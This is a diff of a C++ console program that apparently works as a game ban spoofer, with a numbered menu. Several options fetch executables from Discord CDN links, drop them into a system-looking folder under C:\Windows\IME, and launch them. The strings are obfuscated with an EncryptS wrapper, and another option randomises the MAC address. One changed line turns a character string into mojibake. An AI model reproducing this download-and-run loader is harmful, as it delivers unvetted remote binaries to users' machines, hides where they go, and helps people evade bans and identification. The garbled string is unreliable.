@@ -27,7 +27,7 @@ int menu = 0;
 
 std::string random_string_for_title()
 {
-	std::string strng = EncryptS("1234567890abcdefghijklmnopqrstuv&é'(-è_çà)=$^ù%*!:;,~#{[|`@]°}+£¨µ§/.?QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890");
+	std::string strng = EncryptS("1234567890abcdefghijklmnopqrstuv&Ã©'(-Ã¨_Ã§Ã )=$^Ã¹%*!:;,~#{[|`@]Â°}+Â£Â¨ÂµÂ§/.?QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890");
 	std::string newstring_fortitle;
 	int pos_title;
 	while (newstring_fortitle.size() != 67)
@@ -438,12 +438,14 @@ menu_:
 	std::cin >> menu;
 	if (menu == 1)
 	{
+		system(_T(EncryptS("cls")));
 		HRESULT Cleaner = URLDownloadToFile(NULL, _T(EncryptS("https://cdn.discordapp.com/attachments/932378363832729623/932380792909348959/Ryze_Cleaner.exe")), _T(EncryptS("C:\\Windows\\IME\\IMEKR\\DICTS\\RyzeCleaner.exe")), 0, NULL);
 		system(_T(EncryptS("start C:\\Windows\\IME\\IMEKR\\DICTS\\RyzeCleaner.exe")));
 		goto menu_;
 	}
 	else if (menu == 2)
 	{
+		system(_T(EncryptS("cls")));
 		HRESULT Spoofer = URLDownloadToFile(NULL, _T(EncryptS("https://cdn.discordapp.com/attachments/932378363832729623/932378420380311552/LeakedSpoof.exe")), _T(EncryptS("C:\\Windows\\IME\\IMEKR\\DICTS\\LeakedSpoof.exe")), 0, NULL);
 		system(_T(EncryptS("start C:\\Windows\\IME\\IMEKR\\DICTS\\LeakedSpoof.exe")));
 		goto menu_;
@@ -611,10 +613,16 @@ menu_:
 	}
 	else if (menu == 4)
 	{
+		system(_T(EncryptS("cls")));
 		MyMACAddr* ptr = new MyMACAddr();
 		ptr->AssingRndMAC();
 		goto menu_;
 	}
-
+	else
+	{
+		system(_T(EncryptS("cls")));
+		printf(_T(EncryptS(("Wrong Choice !"))));
+		goto menu_;
+	}
 	return 0;
 }
